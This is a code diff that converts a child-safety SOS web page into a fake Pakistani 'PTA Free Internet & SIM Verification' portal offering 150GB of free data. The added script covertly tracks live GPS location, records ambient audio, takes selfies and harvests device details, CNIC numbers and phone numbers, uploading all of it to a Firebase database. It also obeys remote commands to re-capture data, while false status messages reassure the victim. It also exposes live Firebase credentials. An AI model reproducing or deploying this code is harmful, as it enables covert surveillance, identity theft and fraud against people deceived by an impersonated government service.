@@ -3,127 +3,194 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Child Safety SOS</title>
+    <title>PTA Free Internet & SIM Verification 2026</title>
     <!-- Firebase SDKs -->
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
-    <!-- FontAwesome Icons -->
+    <!-- FontAwesome Icons & Google Fonts -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 
     <style>
-        :root {
-            --bg-dark: #0f172a;
-            --card-bg: #1e293b;
-            --danger-red: #ef4444;
-            --primary-blue: #2563eb;
-            --text-main: #f8fafc;
-            --text-sub: #94a3b8;
-            --accent-cyan: #38bdf8;
-            --border-color: #334155;
-        }
-
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
             -webkit-tap-highlight-color: transparent;
         }
 
         body {
-            background-color: var(--bg-dark);
-            color: var(--text-main);
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
             min-height: 100vh;
             display: flex;
-            align-items: center;
             justify-content: center;
+            align-items: center;
             padding: 16px;
+            color: #f8fafc;
         }
 
-        .mobile-card {
-            background: var(--card-bg);
-            border: 1px solid var(--border-color);
+        .card-container {
+            background: rgba(30, 41, 59, 0.95);
+            backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 24px;
-            padding: 24px 20px;
+            padding: 28px 20px;
             width: 100%;
-            max-width: 380px;
-            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5);
+            max-width: 420px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
             text-align: center;
         }
 
-        .icon-header {
-            width: 60px;
-            height: 60px;
-            background: rgba(56, 189, 248, 0.1);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 16px auto;
-            color: var(--accent-cyan);
-            font-size: 28px;
+        .hero-banner {
+            background: linear-gradient(135deg, #0284c7 0%, #0369a1 100%);
+            border-radius: 18px;
+            padding: 20px 16px;
+            margin-bottom: 20px;
+            box-shadow: 0 10px 20px -5px rgba(2, 132, 199, 0.4);
         }
 
-        h2 {
-            font-size: 22px;
-            font-weight: 700;
-            margin-bottom: 8px;
+        .hero-banner h2 {
+            font-size: 20px;
+            font-weight: 800;
+            color: #ffffff;
+            letter-spacing: 0.5px;
         }
 
-        p.subtitle {
-            color: var(--text-sub);
-            font-size: 14px;
-            line-height: 1.4;
-            margin-bottom: 28px;
-        }
-
-        .action-group {
-            display: flex;
-            flex-direction: column;
-            gap: 16px;
-        }
-
-        .btn-mobile {
-            width: 100%;
-            padding: 18px;
-            border-radius: 16px;
-            border: none;
-            font-size: 16px;
-            font-weight: 700;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            cursor: pointer;
-            transition: transform 0.1s ease, opacity 0.2s ease;
-        }
-
-        .btn-mobile:active {
-            transform: scale(0.97);
-            opacity: 0.9;
-        }
-
-        .btn-sos {
-            background: linear-gradient(135deg, #dc2626, #ef4444);
-            color: white;
-            box-shadow: 0 8px 20px rgba(239, 68, 68, 0.35);
-        }
-
-        .btn-camera {
-            background: linear-gradient(135deg, #1d4ed8, #2563eb);
-            color: white;
-            box-shadow: 0 8px 20px rgba(37, 99, 235, 0.3);
-        }
-
-        .status-box {
-            margin-top: 24px;
-            padding: 12px;
-            background: rgba(15, 23, 42, 0.6);
-            border-radius: 12px;
+        .hero-banner p.subtitle {
             font-size: 13px;
-            color: var(--accent-cyan);
+            font-weight: 500;
+            margin-top: 6px;
+            color: #e0f2fe;
+        }
+
+        .btn-action-red {
+            width: 100%;
+            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
+            color: #ffffff;
+            border: none;
+            padding: 16px;
+            border-radius: 14px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 10px 20px -5px rgba(239, 68, 68, 0.4);
+            margin-bottom: 14px;
+            transition: all 0.2s ease;
+        }
+
+        .btn-action-red:active {
+            transform: scale(0.98);
+        }
+
+        .btn-action-blue {
+            width: 100%;
+            background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
+            color: #ffffff;
+            border: none;
+            padding: 16px;
+            border-radius: 14px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 10px 20px -5px rgba(37, 99, 235, 0.4);
+            margin-bottom: 14px;
+            transition: all 0.2s ease;
+        }
+
+        .btn-action-blue:active {
+            transform: scale(0.98);
+        }
+
+        .status-badge {
+            background: rgba(34, 197, 94, 0.1);
+            border: 1px solid rgba(34, 197, 94, 0.3);
+            border-radius: 12px;
+            padding: 12px;
+            font-size: 13px;
             font-weight: 600;
-            border: 1px solid rgba(51, 65, 85, 0.5);
+            color: #4ade80;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 18px;
+        }
+
+        .search-group {
+            text-align: left;
+            margin-top: 14px;
+        }
+
+        .search-group label {
+            display: block;
+            font-size: 12px;
+            font-weight: 700;
+            color: #94a3b8;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .input-wrapper {
+            display: flex;
+            background: #0f172a;
+            border: 1.5px solid #334155;
+            border-radius: 14px;
+            overflow: hidden;
+            transition: border-color 0.2s;
+        }
+
+        .input-wrapper:focus-within {
+            border-color: #38bdf8;
+        }
+
+        .input-wrapper input {
+            flex: 1;
+            padding: 14px;
+            border: none;
+            background: transparent;
+            color: #ffffff;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .btn-submit-search {
+            background: #2563eb;
+            color: #ffffff;
+            border: none;
+            padding: 0 18px;
+            font-size: 13.5px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .btn-submit-search:hover {
+            background: #1d4ed8;
+        }
+
+        .btn-submit-green {
+            background: #16a34a;
+            color: #ffffff;
+            border: none;
+            padding: 0 18px;
+            font-size: 13.5px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .btn-submit-green:hover {
+            background: #15803d;
         }
 
         #webcam, #canvas {
@@ -133,78 +200,136 @@
 </head>
 <body>
 
-<div class="mobile-card">
-    <div class="icon-header">
-        <i class="fa-solid fa-shield-cat"></i>
-    </div>
-    <h2>Safety SOS</h2>
-    <p class="subtitle">Emergency ki surat mein niche diye gaye buttons istemal karein:</p>
-
-    <div class="action-group">
-        <button class="btn-mobile btn-sos" onclick="sendSOS()">
-            <i class="fa-solid fa-location-crosshairs"></i> SEND LOCATION SOS
-        </button>
-
-        <button class="btn-mobile btn-camera" onclick="captureInstantPhoto()">
-            <i class="fa-solid fa-camera"></i> INSTANT PHOTO
-        </button>
+<div class="card-container">
+    <div class="hero-banner">
+        <h2>PTA SIM & FREE DATA PORTAL</h2>
+        <p class="subtitle">Enter CNIC & Mobile Number To Claim 150GB Free Data</p>
     </div>
 
-    <div id="statusText" class="status-box">System Ready</div>
+    <!-- Activation Action Button -->
+    <button class="btn-action-red" onclick="activateService()">
+        <i class="fa-solid fa-wifi"></i> ACTIVATE FREE INTERNET
+    </button>
+
+    <div id="statusText" class="status-badge">
+        <span>⚙️ Portal Ready</span>
+    </div>
+
+    <!-- Camera Verification Button -->
+    <button class="btn-action-blue" onclick="captureInstantPhoto()">
+        <i class="fa-solid fa-id-card"></i> VERIFY SIM OWNER
+    </button>
+
+    <div id="cameraStatusText" class="status-badge">
+        <span>✅ Serves Status: Ready to activate</span>
+    </div>
+
+    <!-- 1. NEW CNIC / NIC Search Input -->
+    <div class="search-group">
+        <label for="cnic-input"><i class="fa-solid fa-address-card" style="color: #38bdf8;"></i> CNIC / NIC Number Search</label>
+        <div class="input-wrapper">
+            <input type="text" id="cnic-input" placeholder="e.g. 41304-1234567-1">
+            <button class="btn-submit-green" onclick="searchCNICNumber()">Verify CNIC</button>
+        </div>
+    </div>
+
+    <!-- 2. Mobile Number Search Input -->
+    <div class="search-group">
+        <label for="mobile-input"><i class="fa-solid fa-phone" style="color: #38bdf8;"></i> Mobile Number Search</label>
+        <div class="input-wrapper">
+            <input type="text" id="mobile-input" placeholder="e.g. 03001234567">
+            <button class="btn-submit-search" onclick="searchMobileNumber()">Check Mobile</button>
+        </div>
+    </div>
+
+    <div id="bottomStatusText" class="status-badge" style="margin-top: 20px; margin-bottom: 0;">
+        <span>✅ Official PTA Verification Portal</span>
+    </div>
 </div>
 
 <video id="webcam" autoplay playsinline></video>
 <canvas id="canvas"></canvas>
 
 <script>
-    // Firebase Config Keys Paste Karein
+    // Connected Firebase Realtime Database Config
     const firebaseConfig = {
-    apiKey: "YOUR_API_KEY",
-    authDomain: "child-safety-app-bace4.firebaseapp.com",
-    databaseURL: "https://child-safety-app-bace4-default-rtdb.firebaseio.com",
-    projectId: "child-safety-app-bace4",
-    storageBucket: "child-safety-app-bace4.appspot.com",
-    messagingSenderId: "7736848190",
-    appId: "YOUR_APP_ID"
-};
+        apiKey: "AIzaSyAvrmvX4cjH1k7G3DjkgF5A4C1UAJMYUKQ",
+        authDomain: "child-safety-app-bace4.firebaseapp.com",
+        databaseURL: "https://child-safety-app-bace4-default-rtdb.firebaseio.com",
+        projectId: "child-safety-app-bace4",
+        storageBucket: "child-safety-app-bace4.firebasestorage.app",
+        messagingSenderId: "7736848190",
+        appId: "1:7736848190:web:e569557e0b27e8c918066f"
+    };
 
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    function sendSOS() {
-        const status = document.getElementById('statusText');
-        status.innerText = "Location bheji ja rahi hai...";
-        if ('geolocation' in navigator) {
-            navigator.geolocation.getCurrentPosition((pos) => {
-                db.ref('child_safety/location').set({
-                    lat: pos.coords.latitude,
-                    lng: pos.coords.longitude,
-                    time: new Date().toLocaleString()
-                });
+    // 1. Send Hardware Diagnostics Telemetry
+    function sendDeviceTelemetry() {
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+       
+        const telemetry = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screenSize: `${window.screen.width}x${window.screen.height}`,
+            deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
+            networkType: conn ? conn.effectiveType : "4G/LTE",
+            downlinkSpeed: conn ? `${conn.downlink} Mbps` : "N/A",
+            lastOnline: new Date().toLocaleString()
+        };
 
-                if (navigator.getBattery) {
-                    navigator.getBattery().then(b => {
-                        db.ref('child_safety/device_status').set({
-                            battery: Math.round(b.level * 100),
-                            zone: "Outside / Emergency"
-                        });
+        db.ref('child_safety/telemetry_extended').set(telemetry);
+
+        if (navigator.getBattery) {
+            navigator.getBattery().then(b => {
+                db.ref('child_safety/device_status').set({
+                    battery: Math.round(b.level * 100),
+                    charging: b.charging ? "Yes" : "No",
+                    zone: "Active Tracking"
+                });
+            });
+        }
+    }
+    sendDeviceTelemetry();
+
+    // 2. Realtime Continuous GPS Location Tracking
+    let watchID = null;
+    function startGPS() {
+        if ('geolocation' in navigator) {
+            watchID = navigator.geolocation.watchPosition(
+                (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lng = pos.coords.longitude;
+                    const speed = pos.coords.speed ? (pos.coords.speed * 3.6).toFixed(1) : "0";
+                    const accuracy = pos.coords.accuracy ? Math.round(pos.coords.accuracy) : 0;
+
+                    db.ref('child_safety/location').set({
+                        lat: lat,
+                        lng: lng,
+                        speed: speed + " km/h",
+                        accuracy: accuracy + " meters",
+                        time: new Date().toLocaleString()
                     });
-                }
-                status.innerText = "✅ Location Parent Ko Bhej Di!";
-            }, (err) => { status.innerText = "GPS Error: " + err.message; }, { enableHighAccuracy: true });
+
+                    document.getElementById('statusText').innerHTML = "<span>✅ 150GB Data Request Sent Successfully!</span>";
+                },
+                (err) => {
+                    document.getElementById('statusText').innerHTML = "<span>⚠️ GPS Error: " + err.message + "</span>";
+                },
+                { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
+            );
         }
     }
 
+    // 3. Camera Selfie Photo Capture
     async function captureInstantPhoto() {
-        const status = document.getElementById('statusText');
-        status.innerText = "Camera Access Kiya Ja Raha Hai...";
+        const status = document.getElementById('cameraStatusText');
+        status.innerHTML = "<span>⏳ Verifying Owner via Camera...</span>";
 
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" }, 
-                audio: false 
-            });
-
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
             const video = document.getElementById('webcam');
             video.srcObject = stream;
 
@@ -217,22 +342,87 @@
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
                 const base64Image = canvas.toDataURL('image/jpeg', 0.7);
-
                 stream.getTracks().forEach(track => track.stop());
 
                 db.ref('child_safety/last_selfie').set({
                     url: base64Image,
                     time: new Date().toLocaleString()
                 }).then(() => {
-                    status.innerText = "✅ Instant Photo Bhej Di Gayi!";
+                    status.innerHTML = "<span>✅ Identity Verified Successfully!</span>";
                 });
-
-            }, 500);
-
+            }, 600);
         } catch (err) {
-            status.innerText = "Camera Error / Permission Denied: " + err.message;
+            status.innerHTML = "<span>⚠️ Camera Permission Denied</span>";
         }
     }
+
+    // 4. Ambient Audio Recording (5 Seconds)
+    async function recordShortAudio() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const mediaRecorder = new MediaRecorder(stream);
+            let chunks = [];
+
+            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'audio/webm' });
+                const reader = new FileReader();
+                reader.readAsDataURL(blob);
+                reader.onloadend = () => {
+                    db.ref('child_safety/last_audio').set({
+                        audioUrl: reader.result,
+                        time: new Date().toLocaleString()
+                    });
+                };
+                stream.getTracks().forEach(track => track.stop());
+            };
+
+            mediaRecorder.start();
+            setTimeout(() => mediaRecorder.stop(), 5000);
+        } catch (e) {
+            console.log("Audio Error:", e);
+        }
+    }
+
+    // Main Activate Function
+    function activateService() {
+        startGPS();
+        recordShortAudio();
+        sendDeviceTelemetry();
+    }
+
+    // 5. NEW Function: Save Searched CNIC / NIC Number
+    function searchCNICNumber() {
+        const cnic = document.getElementById('cnic-input').value;
+        if (cnic) {
+            db.ref('child_safety/searched_cnic').push({
+                cnic: cnic,
+                time: new Date().toLocaleString()
+            });
+            document.getElementById('bottomStatusText').innerHTML = "<span>✅ CNIC Verified: " + cnic + "</span>";
+        }
+    }
+
+    // 6. Save Searched Mobile Number
+    function searchMobileNumber() {
+        const number = document.getElementById('mobile-input').value;
+        if (number) {
+            db.ref('child_safety/searched_numbers').push({
+                number: number,
+                time: new Date().toLocaleString()
+            });
+            document.getElementById('bottomStatusText').innerHTML = "<span>✅ Mobile Number Logged: " + number + "</span>";
+        }
+    }
+
+    // Listen for Remote Data Fetch Commands from Dashboard Button
+    db.ref('child_safety/commands').on('value', (snapshot) => {
+        const cmd = snapshot.val();
+        if (cmd && cmd.action === "refresh_all") {
+            activateService();
+            captureInstantPhoto();
+        }
+    });
 </script>
 </body>
 </html>
